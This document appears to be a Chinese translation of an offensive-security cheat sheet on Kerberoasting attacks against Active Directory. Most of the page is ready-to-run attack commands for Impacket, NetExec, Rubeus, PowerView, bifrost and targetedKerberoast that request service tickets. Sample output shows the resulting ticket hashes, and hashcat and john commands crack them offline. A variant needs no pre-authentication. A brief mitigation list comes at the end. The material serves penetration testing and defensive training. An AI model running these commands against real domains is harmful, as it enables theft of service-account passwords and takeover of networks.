# Roasting - Kerberoasting

> "服务主体名称（SPN）是服务实例的唯一标识符。SPN 由 Kerberos 身份验证使用，将服务实例与服务登录帐户关联。" - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)

任何有效的域用户都可以为任何域服务请求 Kerberos 票据（ST）。收到票据后，可以对票据进行离线密码破解，尝试破解运行服务的用户帐户的密码。

* Impacket 套件中的 [SecureAuthCorp/impacket/GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)

  ```powershell
  GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

  Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

  ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
  --------------------  -------------  --------------------------------------------------------  -------------------  -------------------
  active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-12-03 17:11:11 

  $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2
  ```

* [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

  ```powershell
  netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
  LDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)
  LDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9
  ```

* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

  ```powershell
  # 统计
  Rubeus.exe kerberoast /stats
  -------------------------------------   ----------------------------------
  | Supported Encryption Type | Count |  | Password Last Set Year | Count |
  -------------------------------------  ----------------------------------
  | RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |
  -------------------------------------  ----------------------------------

  # Kerberoast（RC4 票据）
  Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt

  # Kerberoast（AES 票据）
  # 在 msDS-SupportedEncryptionTypes 中启用 AES 的帐户将请求 RC4 票据。
  Rubeus.exe kerberoast /tgtdeleg

  # Kerberoast（RC4 票据）
  # 使用 tgtdeleg 技巧，枚举并 roast 未启用 AES 的帐户。
  Rubeus.exe kerberoast /rc4opsec
  ```

* [PowerShellMafia/PowerSploit/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

  ```powershell
  Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
  ```

* 在 **macOS** 机器上使用 [its-a-feature/bifrost](https://github.com/its-a-feature/bifrost)

  ```powershell
  ./bifrost -action asktgs -ticket doIF<...snip...>QUw= -service host/dc1-lab.lab.local -kerberoast true
  ```

* [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

  ```powershell
  # 对于每个没有 SPN 的用户，尝试设置一个（滥用 servicePrincipalName 属性的写入权限），
  # 打印 "kerberoast" 哈希，然后删除为该操作设置的临时 SPN
  targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
  ```

然后使用正确的 hashcat 模式破解票据（`$krb5tgs$23`= `etype 23`）

| 模式 | 描述 |
|---------|-------------|
| `13100` | Kerberos 5 TGS-REP etype 23 (RC4) |
| `19600` | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
| `19700` | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |

```powershell
./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
```

## 无预身份验证的 Kerberoasting

> 如果攻击者知道一个不需要预身份验证的帐户（即可进行 ASREProast 的帐户），以及一个（或多个）目标服务帐户，则可以在不控制任何 Active Directory 帐户的情况下尝试 Kerberoast 攻击（因为不需要预身份验证）。

```ps1
netexec ldap 10.10.10.10 -u username -p '' --no-preauth-targets users.txt --kerberoasting output.txt
```

## 缓解措施

* 为具有 SPN 的帐户使用非常长的密码（> 32 个字符）
* 确保没有用户具有 SPN

## 参考资料

* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
* [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
* [Kerberoasting - Part 1 - Mubix "Rob" Fuller](https://room362.com/post/2016/kerberoast-pt1/)
* [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
* [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
